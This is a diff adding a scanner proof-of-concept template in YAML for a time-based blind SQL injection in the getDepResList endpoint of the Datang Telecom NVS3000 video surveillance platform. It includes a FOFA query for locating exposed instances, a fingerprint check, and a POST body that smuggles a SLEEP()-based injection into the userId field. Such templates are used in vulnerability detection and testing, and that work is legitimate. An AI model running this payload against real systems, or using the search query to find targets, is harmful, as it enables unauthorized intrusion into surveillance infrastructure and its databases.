@@ -1,0 +1,23 @@
+id: poc-yaml-datang-dianxin-nvs3000-getdepreslist-sqli
+info:
+  name: 大唐电信NVS3000综合视频监控平台 getDepResList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 综合视频监控平台
+  fofa: body="综合视频监控平台" && body="验证码"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"NVS3000综合视频监控平台")
+- method: POST
+  path: /nvsthird/getDepResList
+  headers:
+    Content-Type: application/json
+  data: '{"userId":"1'' AND (SELECT 8845 FROM (SELECT(SLEEP({{.t1}})))KRNM) AND ''JWDU''=''JWDU"}'
+  expression: status_code == 200 && contains(body,`{"errorMsg":"OK","group":null}`)
+    && contains(headers,"application/json") && duration > t1 && duration < t2
+transport: http
